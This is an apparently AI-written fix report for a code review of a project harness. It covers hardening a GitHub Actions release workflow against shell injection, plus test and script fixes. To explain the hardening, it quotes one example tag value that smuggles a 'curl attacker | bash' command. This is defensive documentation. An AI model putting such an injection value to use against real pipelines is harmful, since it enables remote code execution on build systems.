---
phase: 01-harness-setup
fixed_at: 2026-04-18T11:09:35Z
review_path: .planning/phases/01-harness-setup/01-REVIEW.md
iteration: 1
fix_scope: critical_warning
findings_in_scope: 5
fixed: 5
skipped: 0
status: all_fixed
---

# Phase 1: Code Review Fix Report

**Fixed at:** 2026-04-18T11:09:35Z
**Source review:** `.planning/phases/01-harness-setup/01-REVIEW.md`
**Iteration:** 1
**Fix scope:** critical + warning (info deferred)

**Summary:**
- Findings in scope: 5 (1 Critical + 4 Warnings)
- Fixed: 5
- Skipped: 0
- Info findings (IN-01 through IN-06): out of scope — not attempted

## Fixed Issues

### CR-01 + WR-01 (combined): Harden release.yml against shell injection and placeholder publish

**Files modified:** `.github/workflows/release.yml`
**Commit:** `e3c0a90`
**Applied fix:**
- Routed `inputs.tag` through an `env: INPUT_TAG` block, then dereferenced
  as `$INPUT_TAG` in bash, so GitHub Actions applies safe env-var escaping
  instead of raw `${{ ... }}` interpolation into the shell. This closes the
  shell-injection sink for tags like `v0.3.0"; curl attacker | bash; echo "`.
- Repeated the env-var pattern for `TAG: ${{ steps.tag.outputs.value }}` in
  the build step — no more `${{ ... }}` inside any `run:` bash block.
- Added a tag-shape regex guard `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`
  before using `$TAG` in filenames, giving defence-in-depth against path
  traversal in `dist/`.
- On a tag build without `scripts/build-release.sh`, the workflow now hard
  fails with `::error::` instead of emitting a fake placeholder that would
  be published by `softprops/action-gh-release`. Non-tag dry-runs still
  produce an empty placeholder file (matches Phase 6 scaffolding contract).

**Note:** CR-01 and WR-01 were merged into a single commit because they both
rewrite the same `Build release tarball` step — splitting them would
require a throwaway intermediate state. The commit message calls out both
issue IDs for traceability.

**Logic correctness:** This is a security / control-flow change. The regex
and new `elif` branch warrant human spot-check before the phase verifier
runs the workflow end-to-end.
**Status:** `fixed: requires human verification` — regex + control-flow logic.

---

### WR-02: Anchor CLAUDE.md sudo-npm test to forbidding phrasing

**Files modified:** `tests/harness/10-claude-md.bats`
**Commit:** `1f6991e`
**Applied fix:** Replaced `grep -qi "sudo npm install -g"` with
`grep -qEi "(never|avoid|do not|don't).{0,40}sudo npm install -g"`, which
only matches the phrase when it appears in a prohibition context. Verified
the current `CLAUDE.md` still satisfies the new assertion
(`Never \`sudo npm install -g\` anywhere.`). Added an inline comment
explaining the anti-assertion risk so future edits do not regress it.

**Logic correctness:** Assertion is a regex — passes on current CLAUDE.md;
would fail on a hypothetical "Always sudo npm install -g". Behaviour matches
the finding's intent.
**Status:** `fixed`.

---

### WR-03: Positional identifier in validate-catalog error messages

**Files modified:** `plugin/cli/scripts/validate-catalog.mjs`
**Commit:** `12b5169`
**Applied fix:** Changed `for (const a of catalog.agents)` to
`for (const [i, a] of catalog.agents.entries())` and introduced
`const id = a.name || \`<agents[${i}]>\`;`. All three error messages
(`name fails pattern`, `missing description`, `missing install`) now
interpolate `id`, so a nameless agent reports `agent <agents[2]>: ...`
rather than `agent undefined: ...`. `node --check` passes.

**Logic correctness:** Pure string-formatting change; control flow is
unchanged.
**Status:** `fixed`.

---

### WR-04: Guard empty .bats glob in harness run.sh

**Files modified:** `tests/harness/run.sh`
**Commit:** `6850e2c`
**Applied fix:** Replaced the bare-glob invocation
`"$BATS_BIN" "$HERE"/*.bats` with a `shopt -s nullglob` / array-capture
pattern, then verified the array is non-empty before dispatching to bats.
If the directory is empty, the script exits `2` with a clear message. Added
a comment explaining why (template will be copied into fresh projects).
`bash -n` passes.

**Logic correctness:** Happy-path unchanged (seven `.bats` files under
`tests/harness/`); empty-dir path is defensive and straightforward.
**Status:** `fixed`.

---

## Skipped Issues

None — all in-scope findings were fixed.

## Deferred (out of scope)

The following **Info** findings were not attempted because `fix_scope` was
`critical_warning`. They remain actionable and should be revisited in a
follow-up pass or rolled into later phases as noted:

- **IN-01:** Add `concurrency` group to `test.yml` — trivial CI hygiene.
- **IN-02:** Narrow `nightly-mutation.yml` error-swallowing — explicitly
  deferred by review ("worth narrowing when the mutator becomes a gate in
  v0.4").
- **IN-03:** `bash-mutator.sh` file filter — latent until non-bash binaries
  land in `plugin/bin/`.
- **IN-04:** Dead `else` branch in `release.yml` tag resolution — partly
  collapsed by the CR-01 refactor; remaining `if/else` is now cosmetic only.
- **IN-05:** `validate-catalog.mjs` path resolution — review explicitly
  earmarks for Phase 4 ajv rewrite.
- **IN-06:** Add `trap cleanup EXIT` to `plugin/bin/agentlinux-install`
  stub — Phase 2 will rewrite this file; landing a no-op trap now is
  reasonable template polish but non-urgent.

---

_Fixed: 2026-04-18T11:09:35Z_
_Fixer: Claude (gsd-code-fixer)_
_Iteration: 1_
